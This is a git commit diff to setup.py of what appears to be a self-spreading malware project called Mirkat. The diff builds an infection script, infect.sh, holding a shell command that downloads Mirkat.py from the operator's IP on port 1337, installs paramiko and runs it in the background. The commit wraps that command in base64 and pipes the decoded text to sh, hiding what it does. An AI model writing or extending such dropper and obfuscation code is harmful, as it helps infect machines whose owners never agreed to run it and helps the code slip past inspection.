4eaf340a68c955278d9ee7e204377487071d292a
Tesla <43712252+0x11DFE@users.noreply.github.com>
2021-09-19 00:55:20 +0200

    base64 payload
    Simple base64 encoding/decoding of the payload.

--- script/setup.py
+++ script/setup.py
@@ -1,12 +1,13 @@
-import requests, os
+import requests, os, base64
 
 def setup():
     ip_addr = requests.get('https://api.ipify.org').text
     payload = f'cd /tmp;wget {ip_addr}:1337/Mirkat.py;pip3 install paramiko;nohup python3 Mirkat.py &'
+    base64_payload = f'(echo \'{base64.b64encode(payload)}\' | base64 --decode) | sh'
 
     # Create infect.sh
     with open('../Bin/infect.sh', 'w+') as payload_file:
-        payload_file.write(payload)
+        payload_file.write(base64_payload)
     
     # Create Mirkat.py
     with open('../Mirkat.py', 'r+') as loader_file:
